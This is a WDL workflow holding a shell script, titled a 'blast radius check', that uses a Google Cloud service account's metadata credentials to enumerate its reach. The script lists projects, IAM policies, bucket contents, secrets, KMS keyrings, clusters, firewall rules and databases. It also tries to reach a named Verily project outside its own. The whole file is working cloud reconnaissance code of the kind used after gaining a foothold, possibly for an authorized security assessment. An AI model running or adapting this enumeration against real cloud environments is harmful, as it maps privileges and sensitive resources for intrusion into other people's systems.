version 1.0

workflow BlastRadius {
    call CheckAccess
}

task CheckAccess {
    command <<<
        echo "=== BLAST RADIUS CHECK ===" > results.txt
        echo "Date: $(date -u)" >> results.txt
        echo "" >> results.txt

        # 1. SA identity
        echo "=== SA Identity ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
          >> results.txt 2>&1
        echo "" >> results.txt

        # 2. Current project
        echo "=== Current Project ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
          >> results.txt 2>&1
        echo "" >> results.txt

        echo "=== Project Number ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id" \
          >> results.txt 2>&1
        echo "" >> results.txt

        # 3. List ALL projects this SA can see
        echo "=== Projects List (gcloud) ===" >> results.txt
        gcloud projects list --format="table(projectId,name,projectNumber)" 2>&1 >> results.txt
        echo "" >> results.txt

        # 4. IAM policy on current project - who owns it?
        echo "=== IAM Policy (wb-chipper-diamond-3014) ===" >> results.txt
        gcloud projects get-iam-policy wb-chipper-diamond-3014 --format=yaml 2>&1 >> results.txt
        echo "" >> results.txt

        # 5. Organization info
        echo "=== Organizations ===" >> results.txt
        gcloud organizations list 2>&1 >> results.txt
        echo "" >> results.txt

        # 6. List GCS buckets accessible
        echo "=== GCS Buckets ===" >> results.txt
        gcloud storage ls 2>&1 >> results.txt
        echo "" >> results.txt

        # 7. List contents of each bucket (first 20 objects)
        echo "=== Bucket Contents ===" >> results.txt
        for bucket in $(gcloud storage ls 2>/dev/null); do
            echo "--- $bucket ---" >> results.txt
            gcloud storage ls "$bucket" --recursive 2>&1 | head -30 >> results.txt
            echo "" >> results.txt
        done

        # 8. Compute instances in project
        echo "=== Compute Instances ===" >> results.txt
        gcloud compute instances list 2>&1 >> results.txt
        echo "" >> results.txt

        # 9. BigQuery datasets
        echo "=== BigQuery Datasets ===" >> results.txt
        bq ls --format=pretty 2>&1 >> results.txt
        echo "" >> results.txt

        # 10. Service accounts in project
        echo "=== Service Accounts ===" >> results.txt
        gcloud iam service-accounts list 2>&1 >> results.txt
        echo "" >> results.txt

        # 11. KMS keyrings
        echo "=== KMS Keyrings ===" >> results.txt
        gcloud kms keyrings list --location=global 2>&1 >> results.txt
        gcloud kms keyrings list --location=us-central1 2>&1 >> results.txt
        echo "" >> results.txt

        # 12. VPC networks
        echo "=== VPC Networks ===" >> results.txt
        gcloud compute networks list 2>&1 >> results.txt
        echo "" >> results.txt

        # 13. Firewall rules
        echo "=== Firewall Rules ===" >> results.txt
        gcloud compute firewall-rules list 2>&1 >> results.txt
        echo "" >> results.txt

        # 14. Cloud Functions
        echo "=== Cloud Functions ===" >> results.txt
        gcloud functions list 2>&1 >> results.txt
        echo "" >> results.txt

        # 15. Cloud Run services
        echo "=== Cloud Run ===" >> results.txt
        gcloud run services list 2>&1 >> results.txt
        echo "" >> results.txt

        # 16. GKE clusters - can we see Verily's main cluster?
        echo "=== GKE Clusters ===" >> results.txt
        gcloud container clusters list 2>&1 >> results.txt
        echo "" >> results.txt

        # 17. Try to access the main Verily project
        echo "=== Cross-Project: prj-p-1v-s0i ===" >> results.txt
        gcloud projects describe prj-p-1v-s0i 2>&1 >> results.txt
        echo "" >> results.txt

        # 18. Try to list buckets in Verily's main project
        echo "=== Cross-Project Buckets: prj-p-1v-s0i ===" >> results.txt
        gcloud storage ls --project=prj-p-1v-s0i 2>&1 >> results.txt
        echo "" >> results.txt

        # 19. Batch jobs
        echo "=== Batch Jobs ===" >> results.txt
        gcloud batch jobs list --location=us-central1 2>&1 >> results.txt
        echo "" >> results.txt

        # 20. Secrets Manager
        echo "=== Secrets ===" >> results.txt
        gcloud secrets list 2>&1 >> results.txt
        echo "" >> results.txt

        # 21. Pub/Sub topics
        echo "=== Pub/Sub Topics ===" >> results.txt
        gcloud pubsub topics list 2>&1 >> results.txt
        echo "" >> results.txt

        # 22. Cloud SQL instances
        echo "=== Cloud SQL ===" >> results.txt
        gcloud sql instances list 2>&1 >> results.txt
        echo "" >> results.txt

        # 23. SA's own IAM permissions (what roles does it have?)
        echo "=== SA IAM Roles ===" >> results.txt
        SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
        gcloud projects get-iam-policy wb-chipper-diamond-3014 \
          --flatten="bindings[].members" \
          --filter="bindings.members:${SA_EMAIL}" \
          --format="table(bindings.role)" 2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>

    output {
        File result = "results.txt"
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
